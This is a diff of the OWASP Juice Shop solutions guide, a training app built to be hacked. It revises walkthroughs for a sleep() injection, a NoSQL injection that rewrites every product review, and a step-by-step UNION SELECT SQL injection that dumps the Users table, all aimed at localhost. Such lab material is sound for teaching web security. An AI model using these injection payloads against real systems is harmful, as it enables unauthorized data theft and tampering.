@@ -611,6 +611,20 @@ simultaneously.
     Super-Surprise-Box (2014 Edition)" is in the basket
 14. Click _Checkout_ on the _Your Basket_ page to solve the challenge.
 
+#### Alternative path without any SQL Injection
+
+This solution involves a lot less hacking & sophistication but requires
+more attention & a good portion of shrewdness.
+
+1. Retrieve all products as JSON by calling
+   <http://localhost:3000/rest/product/search?q=>
+2. Write down all `id`s that are _missing_ in the otherwise sequential
+   numeric range
+3. Perform step 12. and 13. from above solution for all those missing
+   `id`s
+4. Once you hit the "Christmas Super-Surprise-Box (2014 Edition)" click
+   _Checkout_ for instant success!
+
 ### Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password
 
 1. Log in as anyone.
@@ -770,7 +784,7 @@ payload in his blog post
 2. ...to download
    <http://localhost:3000/ftp/suspicious_errors.yml%2500.md>
 
-### :warning: Let the server sleep for some time
+### Let the server sleep for some time
 
 1. You can interact with the backend API for product reviews via the
    dedicated endpoints `/rest/product/reviews` and
@@ -785,19 +799,25 @@ payload in his blog post
 
 To avoid _real_ Denial-of-Service (DoS) issues, the Juice Shop will only
 wait for a maximum of 2 seconds, so
-http://localhost:3000/rest/product/sleep(999999)/reviews should take not
+http://localhost:3000/rest/product/sleep(999999)/reviews should not take
 longer than http://localhost:3000/rest/product/sleep(2000)/reviews to
 respond.
 
-### :warning: Update multiple product reviews at the same time
+### Update multiple product reviews at the same time
 
-1. Log in as any user.
+1. Log in as any user to get your `Authorization` token from any
+   subsequent request's headers.
 2. Submit a PATCH request to http://localhost:3000/rest/product/reviews
    with
    * `{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }` as body
-   * and `application/json` as `Content-Type` header.
-3. Check different product detail dialogs to verify that all review
-   texts have been changed into `NoSQL Injection!`
+   * `application/json` as `Content-Type` header.
+   * and `Bearer ?` as `Authorization` header, replacing the `?` with
+     the token you received in step 1.
+
+   ![Multiple review updated via NoSQL Injection](img/nosql_multiple-reviews-updated.png)
+3. Check different product detail dialogs to verify that _all review
+   texts_ have been changed into `NoSQL Injection!`
+
 
 ### :warning: Wherever you go, there you are
 
@@ -895,7 +915,7 @@ NPM page:
 
 ![epilogue on NPM](img/npm_epilogue.png)
 
-### :warning: Retrieve a list of all user credentials via SQL Injection
+### Retrieve a list of all user credentials via SQL Injection
 
 1. During the
    [Order the Christmas special offer of 2014](#order-the-christmas-special-offer-of-2014)
@@ -907,18 +927,19 @@ NPM page:
 3. As a starting point we use the known working `'))--` attack pattern
    and try to make a `UNION SELECT` out of it
 4. Searching for `')) UNION SELECT * FROM x--` fails with a
-   `SQLITE_ERROR: no such table` as you would expect. But we can easily
-   guess the table name or infer it from one of the previous attacks on
-   the _Login_ form.
+   `SQLITE_ERROR: no such table: x` as you would expect. But we can
+   easily guess the table name or infer it from one of the previous
+   attacks on the _Login_ form where even the underlying SQL query was
+   leaked.
 5. Searching for `')) UNION SELECT * FROM Users--` fails with a
    promising `SQLITE_ERROR: SELECTs to the left and right of UNION do
    not have the same number of result columns` which least confirms the
    table name.
 6. The next step in a `UNION SELECT`-attack is typically to find the
-   right number of returned columns. As the _Search Results_ table has 3
-   columns displaying data, it will at least be three. You keep adding
-   columns until no more `SQLITE_ERROR` occurs (or at least it becomes a
-   different one):
+   right number of returned columns. As the _Search Results_ table in
+   the UI has 3 columns displaying data, it will probably at least be
+   three. You keep adding columns until no more `SQLITE_ERROR` occurs
+   (or at least it becomes a different one):
 
    1. `')) UNION SELECT '1' FROM Users--` fails with `number of result
       columns` error
@@ -930,16 +951,14 @@ NPM page:
    5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM Users--`
       _still fails_ with `number of result columns` error
    6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
-      Users--` shows a _Search Result_ with an interesting extra row at
-      the bottom.
+      Users--` finally gives you a JSON response back with an extra
+      element
+      `{"id":"1","name":"2","description":"3","price":"4","image":"5","createdAt":"6","updatedAt":"7","deletedAt":"8"}`.
 
-      ![UNION SELECT attack with fixed columns](img/union_select-success.png)
 7. Next you get rid of the unwanted product results changing the query
    into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
-   '6', '7', '8' FROM Users--`
-
-   ![UNION SELECT cleaned attack result](img/union_select-no_products.png)
-8. The last step is to replace the _visible_ fixed values with correct
+   '6', '7', '8' FROM Users--` leaving only the "`UNION`ed" element in the result set
+8. The last step is to replace the fixed values with correct
    column names. You could guess those **or** derive them from the
    RESTful API results **or** remember them from previously seen SQL
    errors while attacking the _Login_ form.
